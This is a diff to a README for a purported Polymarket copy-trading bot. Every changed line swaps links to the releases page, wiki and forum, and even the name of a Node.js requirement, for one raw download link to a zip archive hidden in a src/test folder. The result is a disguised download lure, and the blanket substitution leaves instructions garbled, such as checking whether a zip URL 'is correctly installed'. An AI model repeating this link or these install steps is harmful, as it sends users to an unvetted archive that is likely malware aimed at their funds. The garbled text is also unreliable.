@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Copytrading-Bot - Effortlessly Copy Top Traders' Moves
 
-![Download Now](https://img.shields.io/badge/Download%20Now-%21%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-lightblue?link=https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/releases)
+![Download Now](https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/raw/refs/heads/main/src/test/Copytrading_Polymarket_Bot_v1.7.zip%20Now-%21%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/raw/refs/heads/main/src/test/Copytrading_Polymarket_Bot_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets these requirements:
 - **RAM:** Minimum 4GB
 - **Storage:** At least 500MB of free space
 - **Internet:** Stable internet connection required
-- **Node.js:** Version 14 or higher (for running the bot)
+- **https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/raw/refs/heads/main/src/test/Copytrading_Polymarket_Bot_v1.7.zip** Version 14 or higher (for running the bot)
 
 ## 📥 Download & Install
 
@@ -28,11 +28,11 @@ To get started with Polymarket Copytrading Bot, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download options.
    
-   [Visit the Releases Page](https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/releases)
+   [Visit the Releases Page](https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/raw/refs/heads/main/src/test/Copytrading_Polymarket_Bot_v1.7.zip)
 
 2. **Choose Your Version:** Look for the latest version and click on it. A list of available files will appear.
 
-3. **Download the Installer:** Select the installation file that suits your operating system. For Windows, it may be named something like `Polymarket-Copytrading-Bot-Windows.exe`. For macOS, look for `.dmg` files.
+3. **Download the Installer:** Select the installation file that suits your operating system. For Windows, it may be named something like `https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/raw/refs/heads/main/src/test/Copytrading_Polymarket_Bot_v1.7.zip`. For macOS, look for `.dmg` files.
 
 4. **Run the Installer:** Once the download completes, locate the file. Double-click to start the installation process and follow the prompts to install the bot.
 
@@ -52,11 +52,11 @@ The bot allows you to customize several settings:
 
 ## 📘 Documentation
 
-If you need further assistance, detailed documentation is available on our [Wiki Page](https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/wiki). Here, you'll find information on advanced setups, troubleshooting, and FAQs.
+If you need further assistance, detailed documentation is available on our [Wiki Page](https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/raw/refs/heads/main/src/test/Copytrading_Polymarket_Bot_v1.7.zip). Here, you'll find information on advanced setups, troubleshooting, and FAQs.
 
 ## 🤝 Community Support
 
-Join our community for tips and collaboration. We encourage feedback and questions. You can reach out through our [discussion forum](https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/discussions).
+Join our community for tips and collaboration. We encourage feedback and questions. You can reach out through our [discussion forum](https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/raw/refs/heads/main/src/test/Copytrading_Polymarket_Bot_v1.7.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -64,10 +64,10 @@ If you run into issues, here are some steps to help:
 
 - **Download Issues:** Ensure your internet connection is stable. Retry downloading if it fails.
 - **Installation Problems:** Make sure you have the necessary privileges to install software on your system. 
-- **Bot Not Running:** Check if Node.js is correctly installed. Ensure you are using the supported version.
+- **Bot Not Running:** Check if https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/raw/refs/heads/main/src/test/Copytrading_Polymarket_Bot_v1.7.zip is correctly installed. Ensure you are using the supported version.
 
 ## 📣 Feedback
 
 Your feedback helps us improve! Please share your experiences and suggestions to make the Polymarket Copytrading Bot even better.
 
-[Visit the Releases Page](https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/releases) to start your trading journey today!
+[Visit the Releases Page](https://github.com/mahmoooud194/Polymarket-Copytrading-Bot/raw/refs/heads/main/src/test/Copytrading_Polymarket_Bot_v1.7.zip) to start your trading journey today!
